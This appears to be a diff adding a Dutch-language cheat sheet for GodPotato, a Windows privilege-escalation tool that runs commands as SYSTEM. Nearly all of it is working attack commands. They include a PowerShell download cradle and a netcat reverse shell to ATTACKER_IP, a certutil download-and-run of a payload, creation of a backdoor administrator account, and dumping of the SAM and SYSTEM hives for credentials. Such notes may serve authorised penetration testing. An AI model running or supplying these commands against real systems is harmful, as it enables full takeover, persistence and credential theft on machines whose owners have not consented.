@@ -1,0 +1,43 @@
+# GodPotato — Privilege escalation via DCOM/Potato (.NET)
+# Exploiteert DCOM om commando's als SYSTEM uit te voeren, werkt op brede range Windows versies
+#
+# === Syntax ===
+# GodPotato-NET4.exe [opties]
+# GodPotato-NET35.exe [opties]
+#
+# === Belangrijkste opties ===
+# -cmd <command>    Commando uitvoeren als SYSTEM
+#
+# === Vereisten ===
+# SeImpersonatePrivilege
+# .NET Framework 3.5 of 4.x (kies juiste binary)
+# Werkt op: Windows Server 2012-2022, Windows 8-11
+#
+# === Voorbeelden ===
+
+# Controle of privilege aanwezig is
+whoami /priv | findstr SeImpersonate
+
+# Basiscommando: wie ben ik als SYSTEM?
+GodPotato-NET4.exe -cmd "cmd /c whoami"
+
+# .NET 3.5 versie (oudere systemen)
+GodPotato-NET35.exe -cmd "cmd /c whoami"
+
+# Reverse shell als SYSTEM
+GodPotato-NET4.exe -cmd "cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# Gebruiker toevoegen als admin
+GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd123 /add && net localgroup Administrators hacker /add"
+
+# Netcat reverse shell
+GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Tasks\nc.exe ATTACKER_IP 443 -e cmd.exe"
+
+# Bestand downloaden en uitvoeren als SYSTEM
+GodPotato-NET4.exe -cmd "cmd /c certutil -urlcache -f http://ATTACKER_IP/payload.exe C:\Windows\Tasks\payload.exe && C:\Windows\Tasks\payload.exe"
+
+# SAM/SYSTEM hives dumpen
+GodPotato-NET4.exe -cmd "cmd /c reg save HKLM\SAM C:\Windows\Tasks\sam && reg save HKLM\SYSTEM C:\Windows\Tasks\sys"
+
+# NOTE: Simpelste interface van alle Potato varianten — alleen -cmd nodig
+# NOTE: Als .NET 4 niet beschikbaar is, gebruik de NET35 versie
